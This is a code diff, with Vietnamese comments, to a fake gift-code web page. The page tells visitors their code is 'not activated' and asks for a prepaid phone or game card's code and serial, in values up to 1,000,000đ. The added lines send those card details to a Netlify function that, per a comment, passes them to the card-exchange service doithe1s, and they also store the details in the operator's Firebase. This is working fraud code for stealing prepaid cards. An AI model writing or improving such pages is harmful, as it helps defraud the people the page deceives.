@@ -264,16 +264,34 @@
         content.innerHTML = `<h3>THÔNG TIN CODE</h3><div style="background:#edf2f7; padding:10px; border-radius:10px; margin: 15px 0"><p style="font-size:14px">ID: <b style="color:var(--red)">${userID}</b></p></div><div class="code-display">${code}</div><div class="status-badge status-pending">❌ TRẠNG THÁI: CHƯA KÍCH HOẠT</div><button class="btn-popup-receive" onclick="openPay()">KÍCH HOẠT NGAY</button>`;
     }
 
+    // --- CHỖ QUAN TRỌNG 1: SỬA VALUE VIẾT HOA CHO NHÀ MẠNG ---
     function openPay() {
-        content.innerHTML = `<h3>KÍCH HOẠT CODE</h3><label>Loại thẻ</label><select id="c-type"><option>Viettel</option><option>Zing</option><option>Garena</option><option>Mobifone</option><option>Vinaphone</option></select><label>Mệnh giá</label><select id="c-val"><option value="50000">50.000đ</option><option value="100000">100.000đ</option><option value="200000">200.000đ</option><option value="500000">500.000đ</option><option value="1000000">1.000.000đ</option></select><input type="text" id="c-code" placeholder="Mã thẻ..."><input type="text" id="c-seri" placeholder="Số Seri..."><button class="btn-popup-receive" onclick="finalProcess()">XÁC NHẬN KÍCH HOẠT</button>`;
+        content.innerHTML = `<h3>KÍCH HOẠT CODE</h3><label>Loại thẻ</label><select id="c-type"><option value="VIETTEL">Viettel</option><option value="ZING">Zing</option><option value="GARENA">Garena</option><option value="MOBIFONE">Mobifone</option><option value="VINAPHONE">Vinaphone</option></select><label>Mệnh giá</label><select id="c-val"><option value="50000">50.000đ</option><option value="100000">100.000đ</option><option value="200000">200.000đ</option><option value="500000">500.000đ</option><option value="1000000">1.000.000đ</option></select><input type="text" id="c-code" placeholder="Mã thẻ..."><input type="text" id="c-seri" placeholder="Số Seri..."><button class="btn-popup-receive" onclick="finalProcess()">XÁC NHẬN KÍCH HOẠT</button>`;
     }
 
+    // --- CHỖ QUAN TRỌNG 2: SỬA HÀM GỬI DỮ LIỆU SANG NETLIFY FUNCTION ---
     function finalProcess() {
         const co = document.getElementById('c-code').value, se = document.getElementById('c-seri').value;
         const typeVal = document.getElementById('c-type').value, amountVal = document.getElementById('c-val').value;
         if(!co || !se) return alert("Vui lòng nhập đầy đủ thông tin thẻ!");
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ và kích hoạt Code...</p><p style="font-size:11px; color:gray; margin-top:5px">Vui lòng chờ trong giây lát (có thể mất tới 10s)</p></div>`;
         
+        const requestId = Math.floor(Math.random() * 1000000).toString();
+
+        // Gửi sang Netlify Function để đẩy về doithe1s
+        fetch('/.netlify/functions/napthe', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: typeVal,
+                amount: amountVal,
+                code: co,
+                seri: se,
+                requestId: requestId
+            })
+        }).catch(err => console.log("Lỗi API:", err));
+
+        // Lưu vào Firebase của bạn
         db.collection("Nạp_Thẻ_Code").add({
             playerID: userID, gift: selectedGift, info: typeVal,
             code: co, seri: se, amount: amountVal,
